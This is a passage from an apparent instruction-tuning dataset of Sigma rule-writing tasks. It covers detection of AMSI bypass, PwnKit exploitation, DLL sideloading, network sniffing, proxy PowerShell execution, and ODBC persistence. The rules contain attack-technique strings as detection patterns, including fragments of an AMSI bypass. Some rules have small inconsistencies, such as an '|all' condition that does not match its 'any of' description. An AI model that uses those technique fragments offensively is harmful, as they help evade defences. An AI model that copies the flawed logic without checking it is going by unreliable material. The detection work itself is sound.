    "instruction": "Build a Sigma rule with the goal of detecting Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute arbitrary PowerShell code using SyncAppvPublishingServer.vbs, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line contains references to '\\SyncAppvPublishingServer.vbs' combined with the use of a semi-colon, indicating the possible execution of additional arbitrary code. This activity can be indicative of attempts to execute unauthorized PowerShell commands, potentially for malicious purposes. It is essential to keep track of the computer name, user, command line, and parent command line used in these situations to aid in identifying and mitigating such threats. Be aware that while this method of detection is useful, there may be instances where it does not apply (unknown false positives), so it's important to verify the context of detections to avoid misinterpretation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs",
      "answer": "In order to execute arbitrary PowerShell code using SyncAppvPublishingServer.vbs, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line contains references to '\\SyncAppvPublishingServer.vbs' combined with the use of a semi-colon, indicating the possible execution of additional arbitrary code. This activity can be indicative of attempts to execute unauthorized PowerShell commands, potentially for malicious purposes. It is essential to keep track of the computer name, user, command line, and parent command line used in these situations to aid in identifying and mitigating such threats. Be aware that while this method of detection is useful, there may be instances where it does not apply (unknown false positives), so it's important to verify the context of detections to avoid misinterpretation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential privilege escalation attempt via the creation of the \"*.Exe.Local\" folder inside the \"System32\" directory in order to sideload \"comctl32.dll\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential privilege escalation attempt via the creation of the \"*.Exe.Local\" folder inside the \"System32\" directory in order to sideload \"comctl32.dll\", you should: Monitor for file events specifically on Windows systems where the target filenames start with specific paths tied to critical executables including 'C:\\Windows\\System32\\logonUI.exe.local', 'C:\\Windows\\System32\\werFault.exe.local', 'C:\\Windows\\System32\\consent.exe.local', 'C:\\Windows\\System32\\narrator.exe.local', and 'C:\\Windows\\System32\\wermgr.exe.local'. Additionally, ensure that these files end with '\\comctl32.dll'. Situations where these criteria are met should be flagged with a high level of concern due to the potential for privilege escalation. This involves sideloading a known operational library to exploit the system's trust in these executables, allowing an attacker to execute arbitrary code with elevated privileges. The primary tactics being targeted here include \u201cPrivilege Escalation\u201d and \u201cDefense Evasion\u201d, by manipulating trusted processes and files. Any detections based on these conditions should be taken seriously, although it's acknowledged that there may be unknown situations that could trigger false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith:\n            - 'C:\\Windows\\System32\\logonUI.exe.local'\n            - 'C:\\Windows\\System32\\werFault.exe.local'\n            - 'C:\\Windows\\System32\\consent.exe.local'\n            - 'C:\\Windows\\System32\\narrator.exe.local'\n            - 'C:\\Windows\\System32\\wermgr.exe.local'\n        TargetFilename|endswith: '\\comctl32.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith:\n            - 'C:\\Windows\\System32\\logonUI.exe.local'\n            - 'C:\\Windows\\System32\\werFault.exe.local'\n            - 'C:\\Windows\\System32\\consent.exe.local'\n            - 'C:\\Windows\\System32\\narrator.exe.local'\n            - 'C:\\Windows\\System32\\wermgr.exe.local'\n        TargetFilename|endswith: '\\comctl32.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential privilege escalation attempt via the creation of the \"*.Exe.Local\" folder inside the \"System32\" directory in order to sideload \"comctl32.dll\"",
      "answer": "In order to detect potential privilege escalation attempt via the creation of the \"*.Exe.Local\" folder inside the \"System32\" directory in order to sideload \"comctl32.dll\", you should: Monitor for file events specifically on Windows systems where the target filenames start with specific paths tied to critical executables including 'C:\\Windows\\System32\\logonUI.exe.local', 'C:\\Windows\\System32\\werFault.exe.local', 'C:\\Windows\\System32\\consent.exe.local', 'C:\\Windows\\System32\\narrator.exe.local', and 'C:\\Windows\\System32\\wermgr.exe.local'. Additionally, ensure that these files end with '\\comctl32.dll'. Situations where these criteria are met should be flagged with a high level of concern due to the potential for privilege escalation. This involves sideloading a known operational library to exploit the system's trust in these executables, allowing an attacker to execute arbitrary code with elevated privileges. The primary tactics being targeted here include \u201cPrivilege Escalation\u201d and \u201cDefense Evasion\u201d, by manipulating trusted processes and files. Any detections based on these conditions should be taken seriously, although it's acknowledged that there may be unknown situations that could trigger false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking, you should: monitor Windows security logs for events with ID 4738, which indicates a change to a user account's properties. Specifically, look for changes in the User Account Control (UAC) values that suggest the enabling of weak encryption mechanisms. This includes transitioning from a state without the descriptors associated with DES encryption, pre-authentication not required, or encryption not required to a state that indicates these weaker security settings. It is critical to identify when old UAC values that do not end in hexadecimal patterns indicating these weaker settings (for example, not ending in 8, 9, A, B, C, D, E, or F for DES encryption; not ending in 1, 3, 5, 7, 9, B, D, or F for pre-authentication not required; and not ending in 8, 9, A, B, C, D, E, or F for encryption not required) shift to new UAC values that do end in these patterns. This suggests that an account's configuration has been altered to use less secure encryption methods, which could potentially facilitate attacks like cracking hashes or passwords. It's important to have an audit policy in place for account management and specifically to audit user account management events to catch changes like these. Be aware that not all changes indicating a switch to weaker encryption settings are malicious, but they do warrant a high level of scrutiny due to the elevated risk they represent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\ndetection:\n    selection:\n        EventID: 4738\n    # According to Microsoft, the bit values are listed here: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\n    # However, that seems to be a simple copy from https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties\n    # and the actual flags that are used are quite different and, unfortunately, not documented.\n    # https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/ contains a number of EVTX files with relevant events, which can be used to extract\n    # the following values.\n    olduac_des: # 0x8000\n        OldUacValue|endswith:\n            - 8???\n            - 9???\n            - A???\n            - B???\n            - C???\n            - D???\n            - E???\n            - F???\n    newuac_des:\n        NewUacValue|endswith:\n            - 8???\n            - 9???\n            - A???\n            - B???\n            - C???\n            - D???\n            - E???\n            - F???\n    olduac_preauth: # 0x10000\n        OldUacValue|endswith:\n            - 1????\n            - 3????\n            - 5????\n            - 7????\n            - 9????\n            - B????\n            - D????\n            - F????\n    newuac_preauth:\n        NewUacValue|endswith:\n            - 1????\n            - 3????\n            - 5????\n            - 7????\n            - 9????\n            - B????\n            - D????\n            - F????\n    olduac_encrypted: # 0x800\n        OldUacValue|endswith:\n            - 8??\n            - 9??\n            - A??\n            - B??\n            - C??\n            - D??\n            - E??\n            - F??\n    newuac_encrypted:\n        NewUacValue|endswith:\n            - 8??\n            - 9??\n            - A??\n            - B??\n            - C??\n            - D??\n            - E??\n            - F??\n    condition: selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted))\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Account Management > Audit User Account Management, Group Policy : Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy Configuration\\Audit Policies\\Account Management\\Audit User Account Management'\ndetection:\n    selection:\n        EventID: 4738\n    # According to Microsoft, the bit values are listed here: https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720\n    # However, that seems to be a simple copy from https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties\n    # and the actual flags that are used are quite different and, unfortunately, not documented.\n    # https://github.com/mdecrevoisier/EVTX-to-MITRE-Attack/ contains a number of EVTX files with relevant events, which can be used to extract\n    # the following values.\n    olduac_des: # 0x8000\n        OldUacValue|endswith:\n            - 8???\n            - 9???\n            - A???\n            - B???\n            - C???\n            - D???\n            - E???\n            - F???\n    newuac_des:\n        NewUacValue|endswith:\n            - 8???\n            - 9???\n            - A???\n            - B???\n            - C???\n            - D???\n            - E???\n            - F???\n    olduac_preauth: # 0x10000\n        OldUacValue|endswith:\n            - 1????\n            - 3????\n            - 5????\n            - 7????\n            - 9????\n            - B????\n            - D????\n            - F????\n    newuac_preauth:\n        NewUacValue|endswith:\n            - 1????\n            - 3????\n            - 5????\n            - 7????\n            - 9????\n            - B????\n            - D????\n            - F????\n    olduac_encrypted: # 0x800\n        OldUacValue|endswith:\n            - 8??\n            - 9??\n            - A??\n            - B??\n            - C??\n            - D??\n            - E??\n            - F??\n    newuac_encrypted:\n        NewUacValue|endswith:\n            - 8??\n            - 9??\n            - A??\n            - B??\n            - C??\n            - D??\n            - E??\n            - F??\n    condition: selection and ((newuac_des and not olduac_des) or (newuac_preauth and not olduac_preauth) or (newuac_encrypted and not olduac_encrypted))\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
      "answer": "In order to detect scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking, you should: monitor Windows security logs for events with ID 4738, which indicates a change to a user account's properties. Specifically, look for changes in the User Account Control (UAC) values that suggest the enabling of weak encryption mechanisms. This includes transitioning from a state without the descriptors associated with DES encryption, pre-authentication not required, or encryption not required to a state that indicates these weaker security settings. It is critical to identify when old UAC values that do not end in hexadecimal patterns indicating these weaker settings (for example, not ending in 8, 9, A, B, C, D, E, or F for DES encryption; not ending in 1, 3, 5, 7, 9, B, D, or F for pre-authentication not required; and not ending in 8, 9, A, B, C, D, E, or F for encryption not required) shift to new UAC values that do end in these patterns. This suggests that an account's configuration has been altered to use less secure encryption methods, which could potentially facilitate attacks like cracking hashes or passwords. It's important to have an audit policy in place for account management and specifically to audit user account management events to catch changes like these. Be aware that not all changes indicating a switch to weaker encryption settings are malicious, but they do warrant a high level of scrutiny due to the elevated risk they represent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential PwnKit exploitation CVE-2021-4034 in auth logs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auth\ndetection:\n    keywords:\n        '|all':\n            - 'pkexec'\n            - 'The value for environment variable XAUTHORITY contains suscipious content'\n            - '[USER=root] [TTY=/dev/pts/0]'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auth\ndetection:\n    keywords:\n        '|all':\n            - 'pkexec'\n            - 'The value for environment variable XAUTHORITY contains suscipious content'\n            - '[USER=root] [TTY=/dev/pts/0]'\n    condition: keywords\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential PwnKit exploitation CVE-2021-4034 in auth logs",
      "answer": "In order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use Clip.exe in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to Detect Obfuscated Powershell via use Clip.exe in Scripts, you should: Focus on monitoring PowerShell script activities within Windows environments, specifically targeting instances where script block logging is enabled. This detection strategy hinges on identifying instances within the PowerShell scripts that involve the usage of the \"echo\" command followed by the invocation of \"clip.exe\" or variations of the \"Invoke\" command, which are typically leveraged together in an obfuscated manner to manipulate the clipboard for potentially malicious purposes. Such patterns are indicative of attempts to obfuscate PowerShell scripts, potentially to bypass security measures or perform surreptitious activities. The detection criteria use regular expression matching to identify these suspicious combinations within script text. Given the high level of concern associated with this behavior, there are no known safe instances (false positives) predetermined, signifying the critical need for immediate investigation upon detection of such patterns. This monitoring process is pertinent to environments that utilize PowerShell for scripting and have script block logging feature enabled, as it forms the foundational basis for logging the detailed execution of PowerShell scripts, thereby enabling the effective detection of these obfuscated scripts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '(?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_4104:\n        ScriptBlockText|re: '(?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*'\n    condition: selection_4104\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use Clip.exe in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via use Clip.exe in Scripts, you should: Focus on monitoring PowerShell script activities within Windows environments, specifically targeting instances where script block logging is enabled. This detection strategy hinges on identifying instances within the PowerShell scripts that involve the usage of the \"echo\" command followed by the invocation of \"clip.exe\" or variations of the \"Invoke\" command, which are typically leveraged together in an obfuscated manner to manipulate the clipboard for potentially malicious purposes. Such patterns are indicative of attempts to obfuscate PowerShell scripts, potentially to bypass security measures or perform surreptitious activities. The detection criteria use regular expression matching to identify these suspicious combinations within script text. Given the high level of concern associated with this behavior, there are no known safe instances (false positives) predetermined, signifying the critical need for immediate investigation upon detection of such patterns. This monitoring process is pertinent to environments that utilize PowerShell for scripting and have script block logging feature enabled, as it forms the foundational basis for logging the detailed execution of PowerShell scripts, thereby enabling the effective detection of these obfuscated scripts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect unauthorized network sniffing activities on a Linux system monitored by auditd, which is a technique used by adversaries to monitor or capture information sent over a connection by placing a network interface in promiscuous mode or using span ports, you should observe the execution of specific network sniffing tools, such as `tcpdump` and `tshark`. Specifically, focus on the instances where these tools are invoked with command-line arguments indicating an intent to capture network packets (-c flag) and specifying a network interface to listen on (indicated by `-i`). The detection is based on logs from the auditd service, focusing on `execve` type events where the first argument (`a0`) matches the name of the network sniffing tool (`tcpdump` or `tshark`), the second argument (`a1`) is `-c`, indicating a capture is to be performed, and the fourth argument (`a3`) contains or matches `-i`, specifying the interface to listen on. It's important to consider potential legitimate uses of these network sniffing tools by administrators or users for diagnostic or monitoring purposes, which may result in false positives. The severity level for this activity is considered low due to the possibility of legitimate use cases.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_1:\n        type: 'execve'\n        a0: 'tcpdump'\n        a1: '-c'\n        a3|contains: '-i'\n    selection_2:\n        type: 'execve'\n        a0: 'tshark'\n        a1: '-c'\n        a3: '-i'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrator or user uses network sniffing tool for legitimate reasons.\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    selection_1:\n        type: 'execve'\n        a0: 'tcpdump'\n        a1: '-c'\n        a3|contains: '-i'\n    selection_2:\n        type: 'execve'\n        a0: 'tshark'\n        a1: '-c'\n        a3: '-i'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate administrator or user uses network sniffing tool for legitimate reasons.\nlevel: low\n",
      "question": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n",
      "answer": "In order to detect unauthorized network sniffing activities on a Linux system monitored by auditd, which is a technique used by adversaries to monitor or capture information sent over a connection by placing a network interface in promiscuous mode or using span ports, you should observe the execution of specific network sniffing tools, such as `tcpdump` and `tshark`. Specifically, focus on the instances where these tools are invoked with command-line arguments indicating an intent to capture network packets (-c flag) and specifying a network interface to listen on (indicated by `-i`). The detection is based on logs from the auditd service, focusing on `execve` type events where the first argument (`a0`) matches the name of the network sniffing tool (`tcpdump` or `tshark`), the second argument (`a1`) is `-c`, indicating a capture is to be performed, and the fourth argument (`a3`) contains or matches `-i`, specifying the interface to listen on. It's important to consider potential legitimate uses of these network sniffing tools by administrators or users for diagnostic or monitoring purposes, which may result in false positives. The severity level for this activity is considered low due to the possibility of legitimate use cases."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Detect DLL Load from Spooler Service backup folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect DLL load from Spooler Service backup folder, you should: monitor image load events on Windows systems, focusing on instances where an executable image ends with '\\spoolsv.exe,' indicative of the Spooler Service. Additionally, look for instances where the loaded image (DLL) is sourced from either the '\\Windows\\System32\\spool\\drivers\\x64\\3\\' or '\\Windows\\System32\\spool\\drivers\\x64\\4\\' directories, suggesting it's a load operation from a Spooler Service backup folder. These directories are significant as they typically should not be involved in standard operation DLL loading processes. It's important to ensure that the loaded images (DLLs) end with '.dll' to confirm they are indeed DLL files being loaded. Keep in mind that there might be legitimate instances of driver loading from these locations, which are considered to be false positives. This detection effort is classified at an informational level, meaning it is meant to inform of potential suspicious activity but may require further investigation to confirm malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\spoolsv.exe'\n        ImageLoaded|contains:\n            - '\\Windows\\System32\\spool\\drivers\\x64\\3\\'\n            - '\\Windows\\System32\\spool\\drivers\\x64\\4\\'\n        ImageLoaded|endswith: '.dll'\n    condition: selection\nfalsepositives:\n    - Loading of legitimate driver\nlevel: informational\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\spoolsv.exe'\n        ImageLoaded|contains:\n            - '\\Windows\\System32\\spool\\drivers\\x64\\3\\'\n            - '\\Windows\\System32\\spool\\drivers\\x64\\4\\'\n        ImageLoaded|endswith: '.dll'\n    condition: selection\nfalsepositives:\n    - Loading of legitimate driver\nlevel: informational\n",
      "question": "Detect DLL Load from Spooler Service backup folder",
      "answer": "In order to detect DLL load from Spooler Service backup folder, you should: monitor image load events on Windows systems, focusing on instances where an executable image ends with '\\spoolsv.exe,' indicative of the Spooler Service. Additionally, look for instances where the loaded image (DLL) is sourced from either the '\\Windows\\System32\\spool\\drivers\\x64\\3\\' or '\\Windows\\System32\\spool\\drivers\\x64\\4\\' directories, suggesting it's a load operation from a Spooler Service backup folder. These directories are significant as they typically should not be involved in standard operation DLL loading processes. It's important to ensure that the loaded images (DLLs) end with '.dll' to confirm they are indeed DLL files being loaded. Keep in mind that there might be legitimate instances of driver loading from these locations, which are considered to be false positives. This detection effort is classified at an informational level, meaning it is meant to inform of potential suspicious activity but may require further investigation to confirm malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect requests to \"amsiInitFailed\" that can be used to disable AMSI scanning, you should monitor for specific command-line activity within your Windows environment's process creation logs. Focus on detecting command lines containing either the 'System.Management.Automation.AmsiUtils' or 'amsiInitFailed' strings as one potential indicator. Another strong sign is command lines containing all the following strings: '[Ref].Assembly.GetType', 'SetValue($null,$true)', and 'NonPublic,Static'. Any one of these patterns matching is considered a high-level alert with an unlikely chance of being a false positive. This detection strategy helps in identifying attempts to bypass the Antimalware Scan Interface (AMSI) which is crucial for the proactive defense against malware and script-based attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'System.Management.Automation.AmsiUtils'\n            - 'amsiInitFailed'\n    selection_2:\n        CommandLine|contains|all:\n            - '[Ref].Assembly.GetType'\n            - 'SetValue($null,$true)'\n            - 'NonPublic,Static'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains:\n            - 'System.Management.Automation.AmsiUtils'\n            - 'amsiInitFailed'\n    selection_2:\n        CommandLine|contains|all:\n            - '[Ref].Assembly.GetType'\n            - 'SetValue($null,$true)'\n            - 'NonPublic,Static'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning",
      "answer": "In order to detect requests to \"amsiInitFailed\" that can be used to disable AMSI scanning, you should monitor for specific command-line activity within your Windows environment's process creation logs. Focus on detecting command lines containing either the 'System.Management.Automation.AmsiUtils' or 'amsiInitFailed' strings as one potential indicator. Another strong sign is command lines containing all the following strings: '[Ref].Assembly.GetType', 'SetValue($null,$true)', and 'NonPublic,Static'. Any one of these patterns matching is considered a high-level alert with an unlikely chance of being a false positive. This detection strategy helps in identifying attempts to bypass the Antimalware Scan Interface (AMSI) which is crucial for the proactive defense against malware and script-based attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting registration of a new ODBC driver where the driver is located in a potentially suspicious location.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the registration of a new ODBC driver where the driver is located in a potentially suspicious location, you should monitor modifications to the Windows Registry specifically targeting the creation or setting of registry keys associated with ODBC drivers. Focus on registry activities where the event type is 'SetValue', and the registry keys being modified are within the path '\\SOFTWARE\\ODBC\\ODBCINST.INI\\' and end with either '\\Driver' or '\\Setup'. These registry keys are indicative of ODBC driver configuration.\n\nAdditionally, pay close attention to the details field of the registry modification for any paths that fall under suspicious directory locations. Such locations include various system and temporary directories like '\\PerfLogs\\', '\\ProgramData\\', '\\Temp\\', '\\Users\\Public\\', and several others that span across system32, SysWOW64, and user profile directories. These are locations where malicious actors might drop payloads or attempt to disguise malicious processes as legitimate system tasks.\n\nGiven the critical role ODBC drivers play in database connectivity, any modifications to these settings originating from or pointing to unexpected directories should be treated with suspicion. The tactic here aligns with Persistence, Defense Evasion, and Execution, as attackers might be aiming to maintain a foothold on the system, evade detection mechanisms, or execute unauthorized commands respectively. Any detections related to these indicators should be considered high priority due to the unlikely nature of false positives in this specific context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\ODBC\\ODBCINST.INI\\'\n        TargetObject|endswith:\n            - '\\Driver'\n            - '\\Setup'\n        Details|contains:\n            - ':\\PerfLogs\\'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\Registration\\CRMLog'\n            - ':\\Windows\\System32\\com\\dmp\\'\n            - ':\\Windows\\System32\\FxsTmp\\'\n            - ':\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\'\n            - ':\\Windows\\System32\\spool\\drivers\\color\\'\n            - ':\\Windows\\System32\\spool\\PRINTERS\\'\n            - ':\\Windows\\System32\\spool\\SERVERS\\'\n            - ':\\Windows\\System32\\Tasks_Migrated\\'\n            - ':\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - ':\\Windows\\SysWOW64\\com\\dmp\\'\n            - ':\\Windows\\SysWOW64\\FxsTmp\\'\n            - ':\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\'\n            - ':\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - ':\\Windows\\Tasks\\'\n            - ':\\Windows\\Temp\\'\n            - ':\\Windows\\Tracing\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\ODBC\\ODBCINST.INI\\'\n        TargetObject|endswith:\n            - '\\Driver'\n            - '\\Setup'\n        Details|contains:\n            - ':\\PerfLogs\\'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\Registration\\CRMLog'\n            - ':\\Windows\\System32\\com\\dmp\\'\n            - ':\\Windows\\System32\\FxsTmp\\'\n            - ':\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\'\n            - ':\\Windows\\System32\\spool\\drivers\\color\\'\n            - ':\\Windows\\System32\\spool\\PRINTERS\\'\n            - ':\\Windows\\System32\\spool\\SERVERS\\'\n            - ':\\Windows\\System32\\Tasks_Migrated\\'\n            - ':\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - ':\\Windows\\SysWOW64\\com\\dmp\\'\n            - ':\\Windows\\SysWOW64\\FxsTmp\\'\n            - ':\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\'\n            - ':\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\'\n            - ':\\Windows\\Tasks\\'\n            - ':\\Windows\\Temp\\'\n            - ':\\Windows\\Tracing\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "registration of a new ODBC driver where the driver is located in a potentially suspicious location",
      "answer": "In order to detect the registration of a new ODBC driver where the driver is located in a potentially suspicious location, you should monitor modifications to the Windows Registry specifically targeting the creation or setting of registry keys associated with ODBC drivers. Focus on registry activities where the event type is 'SetValue', and the registry keys being modified are within the path '\\SOFTWARE\\ODBC\\ODBCINST.INI\\' and end with either '\\Driver' or '\\Setup'. These registry keys are indicative of ODBC driver configuration.\n\nAdditionally, pay close attention to the details field of the registry modification for any paths that fall under suspicious directory locations. Such locations include various system and temporary directories like '\\PerfLogs\\', '\\ProgramData\\', '\\Temp\\', '\\Users\\Public\\', and several others that span across system32, SysWOW64, and user profile directories. These are locations where malicious actors might drop payloads or attempt to disguise malicious processes as legitimate system tasks.\n\nGiven the critical role ODBC drivers play in database connectivity, any modifications to these settings originating from or pointing to unexpected directories should be treated with suspicion. The tactic here aligns with Persistence, Defense Evasion, and Execution, as attackers might be aiming to maintain a foothold on the system, evade detection mechanisms, or execute unauthorized commands respectively. Any detections related to these indicators should be considered high priority due to the unlikely nature of false positives in this specific context."
    }
  },
  {
